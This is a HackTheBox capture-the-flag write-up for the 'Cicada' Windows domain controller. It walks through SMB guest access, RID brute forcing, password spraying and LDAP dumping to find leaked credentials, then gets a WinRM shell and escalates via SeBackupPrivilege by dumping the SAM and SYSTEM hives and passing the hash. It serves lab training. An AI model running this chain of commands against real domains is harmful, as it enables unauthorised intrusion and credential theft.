---
date: 2025-02-13T17:24:03-06:00
# description: ""
image: "/images/HTB-Cicada/Cicada.png"
showTableOfContents: true
tags: ["HackTheBox"]
categories: ["Writeups"]
title: "HTB: Cicada"
type: "post"
---

* Platform: HackTheBox
* Link: [Cicada](https://app.hackthebox.com/machines/Cicada)
* Level: Easy
* OS: Windows
---

Cicada is an Active Directory domain controller. We are able to login through SMB using the guest account, allowing us to retrieve a note containing a password. By performing a RID brute force attack, we enumerate the domain users and discover valid credentials, which we use to authenticate via LDAP. Further enumeration reveals a password stored in a user’s description field, granting access to another SMB share containing a PowerShell script with hardcoded credentials. This enables us to gain an initial foothold on the system. The compromised user possesses the `SeBackupPrivilege` and is a member of the `Backup Operators` group, providing two distinct ways to exploit the target.

Target IP address - `10.10.11.35`

## Scanning

```
nmap -p- -sC -sV -Pn 10.10.11.35
```

**Results**

```shell
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-12 23:27 CST
Nmap scan report for cicada.htb (10.10.11.35)
Host is up (0.059s latency).
Not shown: 65523 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus

88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-01-13 12:32:02Z)

135/tcp   open  msrpc         Microsoft Windows RPC

139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn

389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
|_ssl-date: TLS randomness does not represent time

445/tcp   open  microsoft-ds?

464/tcp   open  kpasswd5?

593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0

3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16

3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
|_ssl-date: TLS randomness does not represent time

5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found

57002/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: CICADA-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 7h00m01s
| smb2-time: 
|   date: 2025-01-13T12:32:54
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 356.76 seconds
```

Our target is running many services related to Active Directory. Let's update the `/etc/hosts` file according to the nmap results.

```
sudo echo "10.10.11.35 cicada.htb cicada.htb0 CICADA-DC.cicada.htb" | sudo tee -a /etc/hosts
```

## Enumeration

Let's start with SMB.

```
smbclient -N -L cicada.htb
```

![SMB shares list](/images/HTB-Cicada/smbclient_cmd.png)

We notice different shares such as `HR` and `DEV`. We can try to login in with a guest account in order to find more information.

```
netexec smb cicada.htb -u Guest -p "" --shares
```

![SMB guest login](/images/HTB-Cicada/shares_list.png)

We can read the shares: `HR` and `IPC$` (default share).

```
smbclient //cicada.htb/HR
```

![HR share content](/images/HTB-Cicada/HR_share.png)

We find a file called `Notice from HR.txt` and download it. The file contains a password: `Cicada$M6Corpb*@Lp#nZp!8`.

![Password found in HR share](/images/HTB-Cicada/notice_from_HR.png)

We now need a username, we can hunt some with netexec.

```
netexec smb cicada.htb -u guest -p '' --rid-brute
```

We extract the usernames and end up with the following list.

![SMB accounts](/images/HTB-Cicada/accounts.png)

```
Administrator
Guest
krbtgt
CICADA-DC$
john.smoulder
sarah.dantelia
michael.wrightson
david.orelious
emily.oscars
```

![SMB usernames list](/images/HTB-Cicada/usernames.png)

We run the password against our username list, and find a match for `michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8`.

```
netexec smb cicada.htb -u users.txt -p 'Cicada$M6Corpb*@Lp#nZp!8' --continue-on-success
```

![SMB credentials match](/images/HTB-Cicada/creds_match.png)


Let's use the new credentials to login via SMB.

```
netexec smb cicada.htb -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8' --shares
```

![michael.wrightson available shares](/images/HTB-Cicada/micheal_smb.png)

This user has access to the `NETLOGON` and `SYSVOL` shares on top of the two previous shares we noticed earlier. Unfortunately none of them contains any valuable information.

Let's try to authenticate via LDAP with the credentials we have.

```
netexec ldap cicada.htb -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8'
```

![LDAP authentication michael.wrightson](/images/HTB-Cicada/LDAP_auth_michael.png)

The credentials are valid! We can obtain more information with `ldapdomaindump`.

```
ldapdomaindump 10.10.11.35 -u 'cicada\michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8'
```

![ldapdomaindump](/images/HTB-Cicada/ldapdomaindump.png)

After opening `domain_users.html` we notice that `david.orelious` left his password (`aRt$Lp#7t*VQ!3`) in the description.

![david.orelious password found](/images/HTB-Cicada/david_pwd.png)

---

It is also possible to use `ldapsearch` to get the password.


We first dump all the information about the domain (**A LOT OF OUTPUT**).

```
ldapsearch -H ldap://cicada.htb -D 'michael.wrightson@cicada.htb' -w 'Cicada$M6Corpb*@Lp#nZp!8' -b 'dc=cicada,dc=htb'
```

This command will display all the user names on the domain.

```
ldapsearch -H ldap://cicada.htb -D 'michael.wrightson@cicada.htb' -w 'Cicada$M6Corpb*@Lp#nZp!8' -b 'dc=cicada,dc=htb' "(objectClass=person)" | grep "sAMAccountName:"
```

![ldapsearch finds domain names](/images/HTB-Cicada/ldapsearch_domain_names.png)

We attempt to find some passwords with the command below.

```
ldapsearch -H ldap://cicada.htb -D 'michael.wrightson@cicada.htb' -w 'Cicada$M6Corpb*@Lp#nZp!8' -b 'dc=cicada,dc=htb' | grep pass
```

![ldapsearch finds passwords](/images/HTB-Cicada/ldapsearch_pwdfind.png)

Then we run the list of users against the new password found.

```
netexec smb cicada.htb -u users.txt -p 'aRt$Lp#7t*VQ!3' --continue-on-success
```

![ldap password match](/images/HTB-Cicada/pwd_match.png)

We now know that the password `aRt$Lp#7t*VQ!3` belong to `david.orelious`.

---

With these new credentials we enumerate SMB once more.

```
netexec smb cicada.htb -u david.orelious -p 'aRt$Lp#7t*VQ!3' --shares
```

![david.orelious available shares](/images/HTB-Cicada/david_smb.png)

This user has access to the `DEV` share.

```
smbclient //cicada.htb/DEV -U david.orelious
```

![DEV share accessed](/images/HTB-Cicada/DEV_share.png)

The `DEV` share contains a file called `Backup_script.ps1` which we download. Its content is below:

```PowerShell
$sourceDirectory = "C:\smb"
$destinationDirectory = "D:\Backup"

$username = "emily.oscars"
$password = ConvertTo-SecureString "Q!3@Lp#M6b*7t*Vt" -AsPlainText -Force
$credentials = New-Object System.Management.Automation.PSCredential($username, $password)
$dateStamp = Get-Date -Format "yyyyMMdd_HHmmss"
$backupFileName = "smb_backup_$dateStamp.zip"
$backupFilePath = Join-Path -Path $destinationDirectory -ChildPath $backupFileName
Compress-Archive -Path $sourceDirectory -DestinationPath $backupFilePath
Write-Host "Backup completed successfully. Backup file saved to: $backupFilePath"
```

## Shell as emily.oscars

The script has the password (`Q!3@Lp#M6b*7t*Vt`)  of `emily.oscars`. With the result of our nmap scan we can see that winrm is running on port 5985. So let's check if we can login with it.

Make a list with the three passwords we have so far and run it against the user names list.

```
netexec winrm cicada.htb -u users.txt -p passwords.txt
```

![WinRM valid credentials](/images/HTB-Cicada/winrm_valid.png)

`emily.oscars:Q!3@Lp#M6b*7t*Vt` are the only valid credentials. 

```
evil-winrm -i cicada.htb -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt'
```

![emily.oscars WinRM login](/images/HTB-Cicada/foothold.png)

The user flag is readable at `C:\Users\emily.oscars.CICADA\Desktop\user.txt`.

We can see that `emily.oscars` has the `SeBackupPrivilege` and with `net user emily.oscars` we learn that she is a member of the `Backup Operators` group.

> While members of the **Backup Operators group** are inherently granted the **SeBackupPrivilege** by default, the reverse is not always true. A user can have the **SeBackupPrivilege** without being a member of the **Backup Operators** group because privileges in Windows can be assigned explicitly to users or groups independently of group membership.

![emily.oscars group membership](/images/HTB-Cicada/backup_operators_group.png)


## Privilege Escalation

Because the current user we control has the `SeBackupPrivilege` and is a member of the `Backup Operators group` we can access the root flag via two different methods.

### Hash Dump method

This [article](https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/) demonstrates how to abuse `SeBackupPrivilege`.

Within the `emily.oscars` shell execute the following commands

```
mkdir Temp
```

![Temp directory creation](/images/HTB-Cicada/Temp_dir.png)

```
reg save hklm\sam c:\Temp\sam
reg save hklm\system c:\Temp\system
```

![SAM & SYSTEM registries](/images/HTB-Cicada/sam_&_system.png)

```
cd Temp
download sam
download system
```

![Registry files download](/images/HTB-Cicada/dl_files.png)

On our local machine we dump the admin hash with the following command.

```
impacket-secretsdump -sam sam -system system local
```

![impacket hash dump](/images/HTB-Cicada/hash_dump.png)

> `pypykatz` can also be used to dump the hashes with the command `pypykatz registry --sam sam system`.

We can now login as the Administrator and read the root flag.

```
evil-winrm -i cicada.htb -u Administrator -H '2b87e7c93a3e8a0ea4a581937016f341'
```

![Administrator login via EvilWinRM](/images/HTB-Cicada/root_flag.png)

### Local Attack

You can also use the method described [here](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges.html#backup-operators). You will need to go to [this](https://github.com/giuliano108/SeBackupPrivilege) Github repo to get `SeBackupPrivilegeUtils.dll` and `SeBackupPrivilegeCmdLets.dll`.

1. After cloning the repo we send the files to the target via our evil-winrm shell.

```
upload /home/kscorpio/Machines/HTB/Cicada//SeBackupPrivilege/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeCmdLets.dll

upload /home/kscorpio/Machines/HTB/Cicada//SeBackupPrivilege/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeUtils.dll
```

![SeBackup files](/images/HTB-Cicada/SeBackup_files.png)

2. Import the libraries

```
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```

![Modules Import](/images/HTB-Cicada/Modules_Import.png)

3. Copy the root flag

```
Copy-FileSeBackupPrivilege C:\Users\Administrator\Desktop\root.txt C:\Users\emily.oscars.CICADA\Documents\root.txt
```

![root flag copied](/images/HTB-Cicada/copy_root_flag.png)



